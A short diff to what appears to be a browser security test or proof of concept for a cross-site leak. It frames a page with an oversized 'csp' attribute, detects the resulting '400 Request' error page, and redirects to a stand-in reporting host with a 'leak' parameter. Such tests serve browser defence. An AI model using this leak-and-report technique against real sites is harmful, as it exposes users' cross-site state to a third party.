@@ -11,7 +11,7 @@
       f.csp = "a".repeat(60000);
       f.onload = function () {
         if (f.contentDocument.title.indexOf("400 Request") >= 0) {
-          document.location.href = "https://a.test/report/?leak=c1233067";
+          document.location.href = "https://a.test/report/?leak=c1233067-CSP";
         }
       };
       document.body.appendChild(f);
